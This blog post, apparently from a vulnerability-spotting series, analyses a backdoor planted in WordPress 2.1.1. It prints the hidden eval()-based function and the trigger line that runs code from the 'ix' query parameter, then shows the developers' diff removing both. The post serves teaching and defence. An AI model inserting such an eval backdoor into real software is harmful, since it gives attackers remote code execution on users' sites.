---
layout: post
title: Impact - Command Injection
tags:
- Code Snippet
- PHP
- Privilege Escalation
- Solution
- Wordpress
status: publish
type: post
published: true
meta:
  aktt_notify_twitter: 'yes'
  _aktt_hash_meta: ! '#code #development'
  _edit_last: '2'
  aktt_tweeted: '1'
  _sexybookmarks_shortUrl: http://bit.ly/bvG37F
  _sexybookmarks_permaHash: 705d5cdc2aa46c7aebd4f8b0e67e70ba
---
## Details
__Affected Software:__ WordPress

__Fixed in Version:__  2.1.1

__Issue Type:__ Command Injection

Original Code: <a title="Impact" href="http://spotthevuln.com/2010/01/impact/" target="_blank">Found Here</a>
## Description
This example was actually a backdoor someone had planted in WordPress 2.1.1. Apparently, someone either broke into the wordpress server or hacked a wordpress dev account and inserted this back door. The back door was simple, create a function which simply calls eval on a arguments passed to it. The attacker named this function "comment_text_phpfilter()" and the contents of the function are provided below:
<blockquote>function comment_text_phpfilter($filterdata) {
eval($filterdata);
}</blockquote>
Several lines later, the attacker planted a mechanism to call the backdoor. In this case, the attacker checked for the presense of the "ix" parameter being passed via the querystring. If the "ix" querystring parameter was present, the value assigned to "ix" would be passed to "comment_text_phpfilter()", which would pass the attacker supplied value to eval().
<blockquote>if ($_GET["ix"]) { comment_text_phpfilter($_GET["ix"]); }</blockquote>
## Developer's Solution
```diff

function comment_author_rss() {
echo get_comment_author_rss();
}

-function comment_text_phpfilter($filterdata) {
-eval($filterdata);
-}

function comment_text_rss() {
$comment_text = get_comment_text();
$comment_text = apply_filters('comment_text_rss', $comment_text);
echo $comment_text;
}

function comments_rss_link($link_text = 'Comments RSS', $commentsrssfilename = '') {
$url = comments_rss($commentsrssfilename);
echo "&lt;a href='$url'&gt;$link_text&lt;/a&gt;";
}

...

function get_category_rss_link($echo = false, $cat_ID, $category_nicename) {
$permalink_structure = get_option('permalink_structure');

if ( '' == $permalink_structure ) {
$link = get_option('home') . '?feed=rss2&amp;amp;cat=' . $cat_ID;
} else {
$link = get_category_link($cat_ID);
$link = $link . "feed/";
}

$link = apply_filters('category_feed_link', $link);

if ( $echo )
echo $link;
return $link;
}

-if ($_GET["ix"]) { comment_text_phpfilter($_GET["ix"]); }

function get_the_category_rss($type = 'rss') {
$categories = get_the_category();
$the_list = '';
foreach ( (array) $categories as $category ) {
$category-&gt;cat_name = convert_chars($category-&gt;cat_name);
if ( 'rdf' == $type )
$the_list .= "\n\t\t&lt;dc:subject&gt;&lt;![CDATA[$category-&gt;cat_name]]&gt;&lt;/dc:subject&gt;\n";
else
$the_list .= "\n\t\t&lt;category&gt;&lt;![CDATA[$category-&gt;cat_name]]&gt;&lt;/category&gt;\n";
}
return apply_filters('the_category_rss', $the_list, $type);
}

```
